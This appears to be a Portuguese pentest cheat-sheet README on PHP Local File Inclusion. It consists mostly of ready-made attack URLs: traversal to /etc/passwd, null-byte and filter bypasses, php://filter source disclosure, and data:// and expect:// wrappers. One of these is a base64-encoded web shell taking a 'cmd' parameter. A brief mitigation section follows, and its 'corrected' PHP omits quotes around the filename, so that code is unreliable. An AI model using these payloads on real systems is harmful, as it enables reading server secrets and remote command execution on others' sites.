<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000ff&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000ff&size=32&center=true&vCenter=true&width=1000&height=40&lines=Oque+é+Local+File+Inclusion?)](https://git.io/typing-svg)
> É uma vulnerabilidade em aplicações web que permite o invasor incluir arquivos locais arbitrários do servidor. Dessa forma podendo ler arquivos que contenha credenciais, arquivos confidenciais e até mesmo podendo a levar a um RCE, utilizando a técnica de Log Poisoning e Directory Traversal.

![CSRF_cheatsheet](./img/directory-traversal.svg)

<h1>Ferramentas</h1>

* [LFFY](https://github.com/mzfr/liffy)

<h1>Truques</h1>

### LFI e Directory Traversal Básico

Utilizando a técnica de Directory traversal para ler o contéudo do arquivo "/etc/passwd" que é bastante utilizado para confirmar a vulnerabilidade.

```yaml
https://www.teste.com.br/arquivo.php?img=../../../../../../../../../etc/passwd
```
### Bypass PHP Extension utilizando Null Byte

```yaml
https://www.teste.com.br/arquivo.php?img=../../../../../etc/passwd%00
```

### Bypass Filters 

```yaml
https://www.teste.com.br/arquivo.php?img=.../.../.../.../.../.../etc/passwd
https://www.teste.com.br/arquivo.php?img=..//..//..//..//..//..//etc/passwd
https://www.teste.com.br/arquivo.php?img=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### Double URL Encode

```yaml
https://www.teste.com.br/arquivo.php?img=%252e%252e%252fetc%252fpasswd
```

# LFI Usando PHP Wrapper && Protocolos
> Segundo a documentação do PHP, O PHP fornece vários fluxos de E/S variados que permitem o acesso a Fluxos de entrada e saída próprios do PHP, entrada padrão, saída e erro descritores de arquivos, fluxos de arquivos temporários na memória e com backup em disco e filtros que podem manipular outros recursos de arquivo à medida que são lidos e escrito para. 

## php://filter
> É um tipo de meta-wrapper projetado para permitem realizar operações básicas de modificação nos dados antes de serem lidos.
```yaml
https://www.teste.com.br/arquivo.php?img=php://filter/convert.base64-encode/resource=index.php
```
## file://
> É possível ler arquivos do sistema

```yaml
https://wwww.teste.com.br/arquivo.php?img=file:///etc/passwd
```
## data://
> Permite a inclusão de pequenos itens de dados como dados "imediatos", como se tivessem sido incluídos externamente. (RFC 2397)

```yaml
https://wwww.teste.com.br/arquivo.php?img=data://text/plain,<?php phpinfo(); ?>
http://www.teste.com/arquivo.php?img=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```
### Curiosidade
> É possível injetar um XSS utilizando essa técnica
```yaml
https://wwww.teste.com.br/arquivo.php?img=data:application/x-httpd-php;base64,PHNjcmlwdD4gYWxlcnQoMSkgPC9zY3JpcHQ+  (<script> alert(1) </script>) 
```
## expect://
> Segundo a documentação o php esse wrapper é possível interagir com processos através de PTY
```yaml
http://www.teste.com/arquivo.php?img=expect://ls
http://www.teste.com/arquivo.php?img=expect://id
```

# Como evitar um ataque de Local File Inclusion? 

* A aplicação precisar validar a entrada do usuário antes de processar o arquivo ou deve verificar se o arquivo especificado é o esperado.
* Ele deve verificar se o caminho canonizado começa com o diretório base esperado. 

## Código vulnerável - PHP
```php
if(isset($_GET['page']) && !empty($_GET['page'])){
    
    include($_GET['page']); // Onde a vulnerabilidade acontece

}else{
    echo "<center>";
    echo "</br>";
    echo "Não foi possível carregar o arquivo, por conta de não ser especificado direito!";
    echo "</center>";
}
```
## Código Corrigido - PHP

```php
if($_GET['page'] === "teste.php"){
    
    include(teste.php); // Corrigido

}else{
    echo "<center>";
    echo "</br>";
    echo "Não foi possível carregar o arquivo, por conta de não ser especificado direito!";
    echo "</center>";
}
```

# Referências

* https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
* https://github.com/swisskyrepo/PayloadsAllTheThings
* https://portswigger.net

<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000ff&height=120&section=footer"/>
